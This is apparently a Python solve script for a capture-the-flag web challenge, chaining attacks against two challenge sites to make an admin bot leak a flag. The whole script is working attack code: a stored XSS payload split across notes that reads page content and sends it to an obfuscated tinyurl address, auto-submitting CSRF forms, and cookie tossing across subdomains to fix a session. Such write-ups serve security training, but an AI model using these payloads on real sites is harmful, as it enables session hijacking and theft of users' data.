#!/usr/bin/env python3

import requests
import random
import time

url = "https://antisocial-media.chall.lac.tf"
trampoline = "https://mavs-fan.chall.lac.tf"
etld = ".chall.lac.tf"

s = requests.Session()

username = "bliutech" + random.randbytes(16).hex()
password = "password" + random.randbytes(16).hex()

r = s.post(url + "/api/login", json={"username": username, "password": password})
r.raise_for_status()

time.sleep(1)

payload = f"""
</script>$`/*
*/f=parent./*
*/frames[0]./*
*/document./*
*/body./*
*/innerText;/*
*/open("ht"+/*
*/"tps://t"+/*
*/"inyurl."+/*
*/"com/bli"+/*
*/"utech?q"+/*
*/"="+f);/*
*/</script><!--
"""
for line in payload.splitlines()[1:]:
    payload = line.strip()
    r = s.post(url + "/api/notes", json={"note": payload})
    r.raise_for_status()

session_cookie = s.cookies.get_dict().get("connect.sid")
print("Session cookie:", session_cookie)

time.sleep(1)

# CSRF the flag on mavs-fan
payload = f"""
<form action='{url}/flag' method='POST'></form>
<img src='x' onerror='document.forms[0].submit()'>
"""
r = s.post(trampoline + "/api/post", data={"message": payload})
r.raise_for_status()
csrf_url = r.url

time.sleep(1)

# Logout CSRF
payload = f"""
<form action='{url}/api/logout' method='POST'></form>
<img src='x' onerror='document.forms[0].submit()'>
"""
r = s.post(trampoline + "/api/post", data={"message": payload})
r.raise_for_status()
logout_url = r.url

time.sleep(1)

# Pivot to mavs-fan and tigger full chain.
payload = f"""
<iframe src='{csrf_url}'></iframe>
<img src='x' onerror="window.payload = document.createElement('div'); window.payload.id='payload'; document.body.appendChild(window.payload);">
<img src='x' onerror="window.payload2 = document.createElement('div'); window.payload2.id='payload2'; document.body.appendChild(window.payload2);">
<img src='x' onerror="setTimeout(() => document.cookie = 'connect.sid={session_cookie};path=/;domain={etld}', 1000)">
<img src='x' onerror="setTimeout(() => document.getElementById('payload').innerHTML += '<iframe src=\\'{logout_url}\\'></iframe>', 2000)">
<img src='x' onerror="setTimeout(() => document.getElementById('payload2').innerHTML += '<iframe src=\\'{url}/profile\\'></iframe>', 3000)">
"""
r = s.post(trampoline + "/api/post", data={"message": payload})
r.raise_for_status()

print("Submit the following URL to the admin bot:")
print("Payload:", r.url)
